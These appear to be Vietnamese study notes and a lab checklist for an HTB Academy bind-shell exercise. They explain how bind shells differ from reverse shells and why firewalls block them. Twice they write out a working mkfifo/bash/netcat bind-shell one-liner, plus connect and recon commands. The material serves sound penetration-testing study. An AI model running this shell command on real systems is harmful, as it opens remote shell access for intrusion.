# Bind Shells

## Ý chính

Bind shell là kiểu shell trong đó **target mở một listener trên một port**, sau đó attacker/Pwnbox kết nối trực tiếp tới IP và port đó để nhận shell.

Mô hình:

```text
Attacker/Pwnbox ---> Target:Port
```
Trong bind shell:

```
Target = server/listenerAttacker = client/connector
```

## Vấn đề thực tế

Bind shell thường khó dùng ngoài thực tế vì:

- Target phải mở listener trước.
- Firewall có thể chặn inbound connection.
- NAT/PAT có thể khiến attacker không connect trực tiếp được vào target.
- Windows/Linux firewall thường block các kết nối đến port lạ.
- Dễ bị phát hiện hơn reverse shell vì target nhận kết nối inbound.

## Netcat cơ bản

Target mở listener:

```
nc -lvnp 7777
```

Attacker kết nối tới target:

```
nc -nv <target_ip> 7777
```

Lúc này mới chỉ là TCP session, chưa phải shell thật.

## Bind shell bằng Netcat + Bash

Trên target:

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <target_ip> 7777 > /tmp/f
```

Trên attacker:

```
nc -nv <target_ip> 7777
```

Nếu thành công, attacker sẽ nhận được Bash shell của target.

## Ghi nhớ

Bind shell = target listen, attacker connect.

Reverse shell = attacker listen, target connect ngược về attacker.

Bind shell dễ bị firewall chặn hơn reverse shell vì cần inbound connection vào target.

---
# Bind Shell Lab Checklist  
  
## 1. Chuẩn bị  
  
- [ ] Spawn Pwnbox hoặc attack box.  
- [ ] Start target machine trong HTB Academy.  
- [ ] Xác định IP target.  
- [ ] Đảm bảo attack box có thể route tới target.  
- [ ] Chỉ thực hiện trong lab/scope được phép.  
  
## 2. Test Netcat TCP session thường  
  
Trên target:  
  
```bash  
nc -lvnp 7777
```
Kiểm tra:

- [ ]  Attacker báo `succeeded`.
- [ ]  Target báo có connection received.
- [ ]  Gửi thử text từ attacker sang target.
- [ ]  Hiểu rằng bước này chưa phải shell thật.

## 3. Tạo bind shell thật

Trên target:

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <target_ip> 7777 > /tmp/f
```

Trên attacker:

```
nc -nv <target_ip> 7777
```

Kiểm tra shell:

```
whoami
id
hostname
pwd
ls
```

## 4. Nếu không connect được

- [ ]  Kiểm tra đúng IP target chưa.
- [ ]  Kiểm tra đúng port chưa.
- [ ]  Kiểm tra listener có đang chạy không.
- [ ]  Thử port khác.
- [ ]  Kiểm tra firewall/NAT.
- [ ]  Kiểm tra target có bind vào đúng interface không.
- [ ]  Dùng `ss -lntp` hoặc `netstat -lntp` trên target nếu có quyền.

## 5. Ghi nhớ phân biệt

Bind shell:

```
Target listen
Attacker connect
```

Reverse shell:

```
Attacker listen
Target connect back
```